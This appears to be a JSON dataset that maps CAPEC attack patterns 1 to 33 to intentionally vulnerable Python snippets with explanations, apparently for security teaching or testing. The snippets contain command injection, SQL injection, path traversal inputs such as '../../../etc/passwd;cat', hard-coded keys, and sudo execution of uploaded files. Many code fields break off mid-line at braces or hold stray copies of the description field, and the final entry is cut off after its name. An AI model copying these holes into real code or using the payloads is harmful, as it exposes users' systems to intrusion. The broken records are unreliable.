[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "\"\"\"\nclass FileHandler:\n    def __init__(self):\n        self.upload_dir = '/uploads/'\n\n    def handle_file_upload(self, user, file):\n        # No authorization check for file uploads\n        filename = file.filename\n        file_path = self.upload_dir + filename\n        \n        # Save file without checking permissions or file type\n        with open(file_path, 'wb') as f:\n            f.write(file.read())\n        \n        # Set insecure default permissions - world readable/writable\n        import os\n        os.chmod(file_path, 0o666)\n\n    def access_resource(self, resource_path):\n        # No ACL checks before accessing resources\n        with open(resource_path, 'r') as f:\n            return f.read()\n\nclass WebServer:\n    def start(self):\n        # Binding to all interfaces without restriction\n        import socket\n        server = socket.socket()\n        server.bind(('0.0.0.0', 8080))\n        server.listen(5)\n\"\"\",\n    \"description\": \"This code demonstrates multiple security vulnerabilities including lack of authorization checks, improper file upload handling, insecure default permissions, and unrestricted network binding. The FileHandler class allows unrestricted file uploads without validating file types or user permissions, and sets world-readable/writable permissions on uploaded files. The access_resource method lacks proper ACL checks, and the WebServer binds to all interfaces (0.0.0.0) without restrictions.\"",
        "description": "\"This code demonstrates multiple security vulnerabilities including lack of authorization checks, improper file upload handling, insecure default permissions, and unrestricted network binding. The FileHandler class allows unrestricted file uploads without validating file types or user permissions, and sets world-readable/writable permissions on uploaded files. The access_resource method lacks proper ACL checks, and the WebServer binds to all interfaces (0.0.0.0) without restrictions.\""
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "\"\"\"\nclass AccountManager:\n    def __init__(self):\n        self.failed_attempts = {",
        "description": "\"This code implements a vulnerable authentication system with an overly restrictive account lockout mechanism. The system locks an account after three failed attempts without implementing any delay between attempts, making it easy for attackers to intentionally lock out legitimate users. It also lacks password strength requirements and proper account recovery mechanisms, making it susceptible to both denial of service and brute force attacks.\""
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "\"\"\"\ndef validate_user_input(file_path):\n    # Flawed validation that only checks for basic path traversal\n    if '../' in file_path or '.\\\\\\\\' in file_path:\n        return False\n    \n    # Strips leading characters before validation\n    cleaned_path = file_path.lstrip('./\\\\\\\\')\n    \n    # Processes the file path without considering all encoding variants\n    try:\n        with open(cleaned_path, 'r') as file:\n            return file.read()\n    except:\n        return None\n\n# Vulnerable usage\ndef process_file_request(user_input):\n    # Can be bypassed with inputs like '....//etc/passwd'\n    # or URL-encoded variants like '%2e%2e%2f/etc/passwd'\n    if validate_user_input(user_input):\n        return validate_user_input(user_input)\n    return 'Access denied'\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable file path handling system that incorrectly strips and validates input paths. It's susceptible to path traversal attacks due to improper handling of alternate encodings and incomplete validation of path equivalence. The validation occurs before path canonicalization and doesn't account for various encoding forms that could bypass the security checks.\"",
        "description": "\"This code demonstrates a vulnerable file path handling system that incorrectly strips and validates input paths. It's susceptible to path traversal attacks due to improper handling of alternate encodings and incomplete validation of path equivalence. The validation occurs before path canonicalization and doesn't account for various encoding forms that could bypass the security checks.\""
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "\"\"\"\ndef authenticate_user(ip_address):\n    # Vulnerable authentication based solely on IP\n    trusted_ips = ['192.168.1.1', '10.0.0.1']\n    \n    # No validation for different IP formats\n    if ip_address in trusted_ips:\n        return True\n        \n    # Unsafe reverse DNS lookup for authentication\n    try:\n        import socket\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        if hostname.endswith('.trusted-domain.com'):\n            return True\n            \n        # Vulnerable to URL encoding bypass\n        if '%' in ip_address:\n            decoded_ip = ip_address.replace('%2E', '.')\n            if decoded_ip in trusted_ips:\n                return True\n    except:\n        pass\n        \n    return False\n\ndef establish_connection(address):\n    # No validation of address format or encoding\n    if authenticate_user(address):\n        import socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((address, 8080))\n        return sock\n    return None\n\"\"\",\n    \"description\": \"This code demonstrates multiple vulnerabilities related to IP address validation and authentication. It relies solely on IP addresses for authentication, performs unsafe reverse DNS lookups, fails to properly validate different IP address formats and encodings, and doesn't properly verify the authenticity of connection endpoints. The code is vulnerable to IP spoofing, DNS poisoning, and encoding bypass attacks.\"",
        "description": "\"This code demonstrates multiple vulnerabilities related to IP address validation and authentication. It relies solely on IP addresses for authentication, performs unsafe reverse DNS lookups, fails to properly validate different IP address formats and encodings, and doesn't properly verify the authenticity of connection endpoints. The code is vulnerable to IP spoofing, DNS poisoning, and encoding bypass attacks.\""
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "\"\"\"\nimport socket\nimport hashlib\n\nclass TelephoneSwitch:\n    def __init__(self):\n        self.authorized_tones = {'1234': 'admin_access'",
        "description": "\"This code simulates a vulnerable telephone switch system that processes control tones for administrative access. It demonstrates multiple security flaws including lack of proper authorization checks, no verification of tone sources, vulnerability to replay attacks, and no message integrity verification. The system accepts simple tones without proper authentication and grants administrative access based solely on matching predefined tone patterns.\""
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "def process_command(user_input):\n    command = 'dir ' + user_input\n    os.system(command)\n\ndef validate_input(input_str):\n    # Incomplete blacklist of dangerous characters\n    bad_chars = ['|', '&']\n    for char in bad_chars:\n        if char in input_str:\n            return False\n    return True\n\ndef execute_user_command(user_data):\n    if validate_input(user_data):\n        process_command(user_data)\n\n# Vulnerable usage\nuser_input = input('Enter directory to list: ')\nexecute_user_command(user_input)",
        "description": "This code demonstrates a vulnerable command injection scenario where user input is insufficiently validated before being used in an OS command. The validation function uses an incomplete blacklist, allowing other dangerous characters through. The comparison logic is flawed, and the command construction doesn't properly neutralize special elements, allowing attackers to inject additional OS commands."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "def check_user_login(username, password):\n    conn = mysql.connector.connect(host='localhost', database='users')\n    cursor = conn.cursor()\n\n    # Vulnerable to blind SQL injection\n    query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\n    \n    try:\n        cursor.execute(query)\n        result = cursor.fetchone()\n        return bool(result)  # Returns True if user exists, False otherwise\n    except:\n        return False  # Suppressing error messages but still vulnerable\n    finally:\n        cursor.close()\n        conn.close()",
        "description": "This code demonstrates a vulnerable login function that is susceptible to blind SQL injection. It suppresses error messages but doesn't properly sanitize user input, allowing an attacker to probe the database through boolean responses. The function directly interpolates user input into the SQL query and returns a boolean result, enabling blind SQL injection attacks through iterative probing."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "def copy_user_data(input_buffer):\n    output_buffer = [0] * 10  # Fixed size buffer\n    index = 0\n    \n    # Vulnerable library function that copies data without bounds checking\n    while input_buffer[index] != '\\0':\n        output_buffer[index] = input_buffer[index]  # No size verification\n        index += 1\n    \n    return output_buffer\n\ndef process_data(user_input):\n    # Convert string to list for processing\n    input_buffer = list(user_input)\n    result = copy_user_data(input_buffer)\n    return ''.join(str(x) for x in result)\n\n# Example usage\nmalicious_input = 'A' * 100  # Input larger than buffer size\nresult = process_data(malicious_input)",
        "description": "This code demonstrates a vulnerable shared library function that performs buffer operations without proper bounds checking. The copy_user_data function represents a shared library component that can be used by multiple parts of a system, containing a classic buffer overflow vulnerability (CWE-120). It copies data from an input buffer to a fixed-size output buffer without verifying the input size, leading to buffer overflow when input exceeds the 10-element limit. The lack of input validation (CWE-20) and improper memory boundary checks (CWE-119) makes this code vulnerable to exploitation across all applications that use this shared library function."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "\"\"\"\ndef process_command(user_input):\n    buffer = bytearray(32)\n    command = f\"ls -l {user_input",
        "description": "\"This code demonstrates a vulnerable command-line utility that contains multiple security flaws including buffer overflow, command injection, and improper input validation. It attempts to process a user-provided input to execute system commands, but fails to properly validate input size, neutralize special characters, and contains unsafe privilege escalation mechanisms.\""
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "\"\"\"\nimport os\n\ndef process_environment_data(env_var_name):\n    buffer = bytearray(16)  # Fixed size buffer\n    \n    # Get environment variable without validation\n    env_data = os.environ.get(env_var_name, '')\n    \n    # Vulnerable copy operation - no size check\n    for i, byte in enumerate(env_data.encode()):\n        buffer[i] = byte  # Potential buffer overflow if env_data > 16 bytes\n    \n    # Process the data\n    admin_flag = buffer[0:4].decode()\n    if admin_flag == 'ADM=':\n        return True\n    return False\n\ndef authenticate_user():\n    os.environ['USER_AUTH'] = 'ADM=1:user_role:admin:token'\n    return process_environment_data('USER_AUTH')\n\"\"\",\n    \"description\": \"This code demonstrates a buffer overflow vulnerability through environment variable manipulation. It creates a fixed-size buffer but performs unchecked copying of environment variable data, potentially causing buffer overflow. It also shows authentication bypass vulnerability by relying on mutable environment variables for authentication. The code combines multiple weaknesses including improper input validation, buffer overflow, and authentication bypass through assumed-immutable data.\"",
        "description": "\"This code demonstrates a buffer overflow vulnerability through environment variable manipulation. It creates a fixed-size buffer but performs unchecked copying of environment variable data, potentially causing buffer overflow. It also shows authentication bypass vulnerability by relying on mutable environment variables for authentication. The code combines multiple weaknesses including improper input validation, buffer overflow, and authentication bypass through assumed-immutable data.\""
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "from flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    \n    # Vulnerable: No validation of file extension or type\n    # Directly uses user-supplied filename\n    upload_path = os.path.join('uploads', filename)\n    \n    # Vulnerable: Determines file handler based solely on extension\n    ext = filename.split('.')[-1].lower()\n    if ext == 'txt':\n        handler = 'text_processor'\n    elif ext == 'img':\n        handler = 'image_processor'\n    elif ext == 'php':\n        # Vulnerable: PHP files allowed and included\n        include_path = f'includes/{filename}'\n        exec(open(include_path).read())\n    \n    file.save(upload_path)\n    return f'File uploaded and processed by {handler}'",
        "description": "This vulnerable code allows unrestricted file uploads and determines file handling based solely on file extensions. It includes multiple vulnerabilities: no validation of file names or extensions, direct use of user-supplied filenames, unsafe handling based on extensions, and potential remote file inclusion through PHP files. The code could allow attackers to upload malicious files, trigger wrong handlers, or execute arbitrary code through carefully crafted filenames and extensions."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "\"\"\"\nimport socket\nimport struct\n\nclass MulticastManager:\n    def __init__(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.groups = {",
        "description": "\"This vulnerable code implements a multicast messaging system that allows clients to join groups and exchange messages. It contains multiple security flaws: lack of authentication for joining groups, no verification of sender identities, potential exposure of sensitive information in messages, missing message integrity checks, and improper validation of client permissions. An attacker could exploit these vulnerabilities to impersonate other clients, intercept sensitive information, or gain unauthorized access to group communications.\""
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import os\nimport subprocess\n\ndef process_user_command(user_input):\n    # Read environment variables used by the application\n    app_path = os.environ.get('APP_PATH', '/default/path')\n    user_role = os.environ.get('USER_ROLE', 'guest')\n    config_file = os.environ.get('CONFIG_FILE', 'config.ini')\n    \n    # No validation of environment variables or user input\n    command = f'{app_path}/process.sh {user_input} {config_file}'\n    \n    # Directly use environment variables without integrity checks\n    if user_role == 'admin':\n        # Execute command without sanitization\n        result = subprocess.run(command, shell=True, capture_output=True)\n        return result.stdout\n    \n    return 'Access denied'\n\n# Usage\nuser_supplied_input = '../../../etc/passwd;cat'\noutput = process_user_command(user_supplied_input)",
        "description": "This vulnerable code demonstrates environment variable manipulation by accepting unvalidated user input and environment variables without integrity checks. It allows path traversal, command injection, and authentication bypass by manipulating environment variables. The code lacks input validation, proper authorization checks, and relies on mutable environment variables for security decisions."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "def handle_client_request(client_socket):\n    buffer = bytearray(64)\n    received_data = client_socket.recv(1024)\n    \n    # Vulnerable: No size check before copying\n    for i in range(len(received_data)):\n        buffer[i] = received_data[i]\n    \n    # Process the received data without validation\n    content_length = int(received_data[:8])\n    content = buffer[8:8+content_length]\n    \n    # Send response without integrity check\n    response = b'HTTP/1.1 200 OK\\r\\n'\n    response += b'Content-Type: text/html\\r\\n\\r\\n'\n    response += content\n    client_socket.send(response)",
        "description": "This vulnerable code demonstrates a classic buffer overflow scenario in a client-server interaction where a malicious service can send carefully crafted data to overflow the fixed-size buffer. The code lacks input validation, buffer size checks, and data integrity verification. It also includes unsafe integer operations and boundary checks, making it susceptible to buffer overflow attacks through malicious input."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "def execute_command(user_input):\n    # Attempt to filter dangerous characters using a denylist\n    dangerous_chars = ['|', ';', '&&', '>']\n    filtered_input = user_input\n    for char in dangerous_chars:\n        filtered_input = filtered_input.replace(char, '')\n    \n    # Construct and execute command with filtered input\n    command = f'ls {filtered_input}'\n    os.system(command)\n\ndef process_user_request():\n    user_data = input('Enter directory to list: ')\n    execute_command(user_data)",
        "description": "This vulnerable code demonstrates command injection through incomplete input sanitization using a denylist approach. The code attempts to filter known dangerous characters but fails to account for all possible command delimiters and special characters. An attacker could bypass the filter using alternate delimiters (like backticks, $(), or newlines) to inject malicious commands. The code directly concatenates user input into a command string without proper validation or escaping, making it susceptible to OS command injection."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "def login_system():\n    # Simple user database with plain text passwords\n    users = {'admin': 'password123', 'user': 'welcome'}\n    \n    # No account lockout mechanism\n    while True:\n        username = input('Username: ')\n        password = input('Password: ')\n        \n        if username in users and users[username] == password:\n            print('Access granted')\n            return True\n        \n        print('Invalid credentials')\n        # No delay between attempts\n        # No password complexity requirements\n        # No password expiration\n        continue",
        "description": "This vulnerable code demonstrates a basic login system that is susceptible to dictionary attacks. It features multiple security weaknesses including: no password complexity requirements, no account lockout mechanism, no multi-factor authentication, plain text password storage, no password aging/expiration, and allows unlimited authentication attempts without any delay or monitoring."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\n\ndef process_uploaded_file(uploaded_file, target_dir):\n    # Blindly accepting user-provided file and path\n    target_path = os.path.join(target_dir, uploaded_file.filename)\n    \n    # Save file without checking permissions or validating path\n    with open(target_path, 'wb') as f:\n        shutil.copyfileobj(uploaded_file.file, f)\n    \n    # Dangerous: executing uploaded file with root privileges\n    os.system(f'sudo {target_path",
        "description": "\"This code demonstrates multiple security vulnerabilities including incorrect permission assignment, improper authorization, least privilege violation, and unsafe file execution. It allows unrestricted file uploads, sets overly permissive file permissions, executes files with elevated privileges without proper checks, and fails to implement proper access controls or ownership verification.\""
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "\"\"\"\ndef render_profile_page(user_profile):\n    # Vulnerable image gallery implementation\n    profile_html = '<div class=\"profile\">'\n    profile_html += f'<h1>{user_profile[\"name\"]",
        "description": "\"This code contains multiple XSS vulnerabilities by failing to sanitize user input in various HTML contexts including img tags, XML comments, and error messages. It allows attackers to inject malicious scripts through image URLs, comments, and error messages that bypass typical XSS filters focused on standard script tags.\""
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "# User profile management system\ndef update_user_profile(user_input):\n    # Unsanitized user input directly executed\n    profile_script = user_input.get('custom_script', '')\n    \n    # Dangerous: Allows execution of arbitrary JavaScript in user profiles\n    html_output = f\"<div class='profile'>\n        <script src='https://untrusted-cdn.example.com/widget.js'></script>\n        <script>\n            {profile_script}\n            loadExternalContent();\n        </script>\n        <span>{user_input.get('name', '')}</span>\n    </div>\"\n    \n    # Store and serve to other users without sanitization\n    save_to_database(html_output)\n    return html_output\n\ndef load_external_content():\n    # Recursive call to potentially non-reentrant code\n    update_user_profile({'name': 'guest', 'custom_script': 'load_external_content()'})",
        "description": "This vulnerable code allows arbitrary script injection through user input, includes untrusted external scripts, and creates potentially dangerous recursive calls. It lacks proper input sanitization, access controls, and content security policies, enabling XSS attacks and execution of malicious code."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "from Crypto.Cipher import DES\nimport base64\n\ndef encrypt_data(data):\n    # Using weak DES encryption with a static key and IV\n    key = b'12345678'  # Hard-coded 8-byte key\n    iv = b'00000000'   # Weak, predictable IV\n    \n    cipher = DES.new(key, DES.MODE_CBC, iv)\n    # Pad data to match block size\n    padded_data = data + (8 - len(data) % 8) * chr(8 - len(data) % 8)\n    encrypted = cipher.encrypt(padded_data.encode())\n    return base64.b64encode(encrypted).decode()\n\ndef decrypt_data(encrypted_data):\n    key = b'12345678'  # Same hard-coded key\n    iv = b'00000000'   # Same weak IV\n    \n    cipher = DES.new(key, DES.MODE_CBC, iv)\n    decrypted = cipher.decrypt(base64.b64decode(encrypted_data))\n    return decrypted.decode().rstrip(chr(decrypted[-1]))\n\n# Usage\nsensitive_data = 'secret_password123'\nencrypted = encrypt_data(sensitive_data)",
        "description": "This code demonstrates multiple cryptographic vulnerabilities including use of the outdated DES encryption algorithm, a hard-coded cryptographic key, a weak and static initialization vector (IV), and insufficient encryption strength. The implementation makes it susceptible to brute force attacks due to DES's small key space (56 bits) and predictable IV. The hard-coded key and static IV further weaken the encryption, making it easier for attackers to decrypt the ciphertext through exhaustive key searches."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "class SessionManager:\n    def __init__(self):\n        self.sessions = {}\n        self.session_counter = 1000\n\n    def create_session(self, user_id):\n        # Vulnerable: Predictable session ID\n        session_id = str(self.session_counter)\n        self.session_counter += 1\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def validate_session(self, session_id):\n        # Vulnerable: No session expiration\n        # Vulnerable: No origin validation\n        # Vulnerable: Assumes session_id is immutable\n        if session_id in self.sessions:\n            return self.sessions[session_id]\n        return None\n\n    def set_cookie(self, response, session_id):\n        # Vulnerable: Persistent cookie with sensitive data\n        # Vulnerable: No secure flag, no httpOnly flag\n        response.set_cookie('session_id', session_id, expires=365*24*3600)\n\n    def get_user_data(self, session_id):\n        # Vulnerable: No server-side validation of session state\n        # Vulnerable: Relies on client-side session data\n        user_id = self.sessions.get(session_id)\n        return {'user_id': user_id, 'privileges': 'admin' if user_id else 'guest'}",
        "description": "This vulnerable session management implementation demonstrates multiple authentication bypass vulnerabilities including predictable session IDs, lack of session validation, persistent cookies with sensitive data, and improper session state management. An attacker could easily guess or hijack session IDs to impersonate legitimate users."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "def authenticate_client(client_ip):\n    trusted_ips = ['192.168.1.100', '192.168.1.101']\n    \n    # Vulnerable authentication based only on IP address\n    if client_ip in trusted_ips:\n        return True\n    \n    return False\n\ndef handle_sensitive_data(client_ip, request_data):\n    # No validation of client identity beyond IP check\n    if authenticate_client(client_ip):\n        sensitive_data = {\n            'api_key': 'secret_key_123',\n            'user_records': get_user_database(),\n            'admin_password': 'admin123'\n        }\n        return sensitive_data\n    \n    return 'Access denied'\n\ndef get_user_database():\n    return {'users': [{'id': 1, 'password': 'plain_text_pw'}]}\n\n# Usage\nclient_request_ip = request.remote_addr  # Easily spoofable\nresponse = handle_sensitive_data(client_request_ip, request.data)",
        "description": "This vulnerable code demonstrates authentication bypass through IP spoofing, where the server trusts the client solely based on IP address without proper validation. It exposes sensitive information (API keys, passwords) to potentially unauthorized actors and lacks proper input validation and protection mechanisms. The authentication scheme is weak and can be easily circumvented by an attacker who spoofs a trusted IP address."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "\"\"\"\nimport os\nfrom flask import Flask, request, send_file\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/var/www/uploads/'\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    filepath = os.path.join(UPLOAD_FOLDER, filename)\n    file.save(filepath)\n    \n    if filename.endswith('.pdf'):\n        os.system(f'pdftotext {filepath",
        "description": "\"This vulnerable code demonstrates a file upload system that fails to properly validate uploaded files, blindly trusts file extensions, and executes files based on their extensions. It allows unrestricted file uploads, performs unsafe system commands on uploaded files, and serves files directly from the upload directory without proper sanitization or content verification. The code is susceptible to malicious file uploads and remote code execution through specially crafted files.\""
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "\"\"\"\ndef process_user_input(user_data):\n    buffer = bytearray(16)  # Fixed size buffer\n    input_data = user_data.encode()\n    \n    # Vulnerable: No size checking before copy\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # Potential buffer overflow\n    \n    # Vulnerable filter implementation\n    filtered_data = ''\n    try:\n        for char in buffer:\n            # Basic filter that can be overwhelmed\n            if char < 128:  # Simple ASCII check\n                filtered_data += chr(char)\n    except:\n        # Unsafe failure: returns original input if filter fails\n        return user_data\n    \n    return filtered_data\n\n# Usage example that could trigger the vulnerability\nlong_input = \"A\" * 100\nresult = process_user_input(long_input)\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable filtering mechanism that can be exploited through buffer overflow. The function uses a fixed-size buffer without proper bounds checking and implements an unsafe filter that returns unfiltered input when it fails. It's vulnerable to oversized transactions and doesn't properly validate input length, potentially leading to memory corruption.\"",
        "description": "\"This code demonstrates a vulnerable filtering mechanism that can be exploited through buffer overflow. The function uses a fixed-size buffer without proper bounds checking and implements an unsafe filter that returns unfiltered input when it fails. It's vulnerable to oversized transactions and doesn't properly validate input length, potentially leading to memory corruption.\""
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "import threading\n\nclass BankAccount:\n    def __init__(self, balance):\n        self.balance = balance\n        self.lock = threading.Lock()\n    \n    def transfer(self, other_account, amount):\n        with self.lock:\n            # Artificial delay to increase deadlock probability\n            import time\n            time.sleep(0.1)\n            \n            # Try to acquire lock on other account\n            with other_account.lock:\n                if self.balance >= amount:\n                    self.balance -= amount\n                    other_account.balance += amount\n\n# Create two accounts\naccount1 = BankAccount(1000)\naccount2 = BankAccount(1000)\n\n# Create two threads attempting simultaneous transfers\nt1 = threading.Thread(target=account1.transfer, args=(account2, 500))\nt2 = threading.Thread(target=account2.transfer, args=(account1, 300))\n\n# Start both threads\nt1.start()\nt2.start()",
        "description": "This code demonstrates a classic deadlock scenario in a banking system where two accounts attempt to transfer money to each other simultaneously. The deadlock occurs because each thread acquires a lock on its own account and then tries to acquire a lock on the other account. If both threads acquire their first lock at nearly the same time, they will each wait indefinitely for the other thread to release its lock, resulting in a deadlock condition. The code violates proper synchronization practices and demonstrates unsafe locking patterns that can lead to system-wide resource contention."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "\"\"\"\nimport os\nimport threading\n\nclass BankAccount:\n    def __init__(self, balance):\n        self.balance = balance\n        # Missing proper synchronization mechanism\n        \n    def withdraw(self, amount):\n        # Race condition: check-then-act pattern without proper locking\n        current_balance = self.balance\n        if current_balance >= amount:\n            # Simulate some processing time where race condition can occur\n            threading.Thread(target=lambda: time.sleep(0.1)).start()\n            self.balance = current_balance - amount\n            return True\n        return False\n\ndef concurrent_withdrawals():\n    account = BankAccount(100)\n    # Create multiple threads attempting to withdraw simultaneously\n    t1 = threading.Thread(target=lambda: account.withdraw(100))\n    t2 = threading.Thread(target=lambda: account.withdraw(100))\n    \n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n    \n    # Due to race condition, balance might become negative\n    print(f\"Final balance: {account.balance",
        "description": "\"This code demonstrates a race condition vulnerability in a banking system where multiple threads can withdraw money simultaneously without proper synchronization. The check-then-act pattern in the withdraw method creates a time window where concurrent access can lead to incorrect balance calculations, potentially allowing multiple withdrawals even when there are insufficient funds.\""
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "\"\"\"\nimport os\nimport tempfile\nimport shutil\n\ndef process_sensitive_file(input_data):\n    temp_path = '/tmp/sensitive_data_temp'\n    final_path = '/etc/sensitive_config'\n    \n    # Check if temporary file exists\n    if not os.path.exists(temp_path):\n        # Vulnerable window between check and creation\n        # where attacker can create symlink\n        with open(temp_path, 'w') as f:\n            f.write(input_data)\n    \n    # Copy temp file to final destination with elevated privileges\n    if os.path.exists(temp_path):\n        shutil.copy2(temp_path, final_path)\n        os.remove(temp_path)\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates a TOCTOU race condition with symbolic links. It checks for a temporary file's existence before writing, creating a race window where an attacker could create a symlink pointing to a sensitive file. The code also lacks proper file locking and permission controls during the copy operation, making it susceptible to symlink attacks that could allow writing to unauthorized locations.\"",
        "description": "\"This vulnerable code demonstrates a TOCTOU race condition with symbolic links. It checks for a temporary file's existence before writing, creating a race window where an attacker could create a symlink pointing to a sensitive file. The code also lacks proper file locking and permission controls during the copy operation, making it susceptible to symlink attacks that could allow writing to unauthorized locations.\""
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "def process_user_input(input_data):\n    # No input validation performed\n    command = 'echo ' + input_data\n    \n    try:\n        # Directly using user input in system command\n        result = os.system(command)\n        \n        if result != 0:\n            # Revealing sensitive error information\n            error_msg = f'Command failed with error {result} in directory {os.getcwd()}'\n            print(error_msg)\n            \n        return result\n    except Exception as e:\n        # Exposing system details in error message\n        print(f'System error: {str(e)}')\n        return None",
        "description": "A vulnerable function that processes user input without proper validation or sanitization, directly using it in system commands and revealing sensitive information in error messages. The code is particularly susceptible to command injection attacks and information disclosure through error messages, making it an ideal target for fuzzing-based attacks."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "def write_sensitive_data(filename, data):\n    # Check if file exists and is writable\n    if os.access(filename, os.W_OK):\n        # Delay between check and use\n        time.sleep(0.1)  # Simulate some processing\n        \n        # Attempt to write data to file\n        with open(filename, 'w') as f:\n            f.write(data)\n            \n def read_sensitive_data(filename):\n    # Check if file exists and is readable\n    if os.access(filename, os.R_OK):\n        # Delay between check and use\n        time.sleep(0.1)  # Simulate some processing\n        \n        # Attempt to read data from file\n        with open(filename, 'r') as f:\n            return f.read()",
        "description": "This code demonstrates a classic TOCTOU (Time of Check to Time of Use) race condition vulnerability in file operations. The code checks file permissions using os.access() and then performs file operations after a delay. During this delay, an attacker could modify the file or its permissions, potentially leading to unauthorized access or file content manipulation. The vulnerability exists because the file state verification and actual file operation are not atomic, creating a race window that can be exploited."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import ctypes\nimport sys\nimport threading\n\ndef vulnerable_thread_hijack():\n    # Get handle to kernel32.dll\n    kernel32 = ctypes.windll.kernel32\n    \n    # Get current process ID\n    pid = kernel32.GetCurrentProcessId()\n    \n    def privileged_thread():\n        while True:\n            # Simulating privileged operations\n            command = input('Enter system command: ')\n            os.system(command)  # Vulnerable to command injection\n    \n    # Create thread with elevated privileges\n    thread = threading.Thread(target=privileged_thread)\n    thread.start()\n    \n    # Get thread handle\n    thread_id = thread.ident\n    handle = kernel32.OpenThread(0x1F03FF, False, thread_id)\n    \n    # Suspend thread\n    kernel32.SuspendThread(handle)\n    \n    # Modify thread context (simulated)\n    # In a real attack, this would inject malicious code\n    thread_context = ctypes.create_string_buffer(512)\n    kernel32.GetThreadContext(handle, thread_context)\n    \n    # Resume thread with modified context\n    kernel32.ResumeThread(handle)",
        "description": "This code demonstrates thread hijacking vulnerability by creating a privileged thread, suspending it, and modifying its context. It includes multiple vulnerabilities: improper privilege management (CWE-270), unsafe command execution (CWE-78), race conditions in thread handling (CWE-362), and exposure of sensitive process information through shared resources (CWE-1421). The code allows arbitrary command execution and thread manipulation, making it susceptible to privilege escalation attacks."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, make_response, session\nimport base64\n\napp = Flask(__name__)\napp.secret_key = 'very_secret_key'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    \n    if username == 'admin' and password == 'password123':\n        # Store sensitive data in cookie without encryption\n        auth_data = f'{username",
        "description": "\"This vulnerable code demonstrates insecure cookie handling by storing sensitive credentials in cleartext cookies, lacking proper validation, using persistent cookies with sensitive data, and trusting client-side data without verification. It shows multiple vulnerabilities including missing encryption, improper authentication, and cookie manipulation risks.\""
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q')\n    # Vulnerable: directly inserting user input into HTML response\n    html_response = f\"<h1>Search results for: {query}</h1>\"\n    return html_response\n\n@app.route('/profile')\ndef profile():\n    user_data = request.args.get('data')\n    # Vulnerable: no validation of URI encoded input\n    profile_content = f\"<div class='profile'>{user_data}</div>\"\n    return profile_content\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "A vulnerable Flask web application that demonstrates XSS vulnerabilities through improper handling of query string parameters. The application accepts user input via GET requests and directly embeds it into HTML responses without proper sanitization or encoding, allowing script injection through both regular and URI-encoded payloads."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
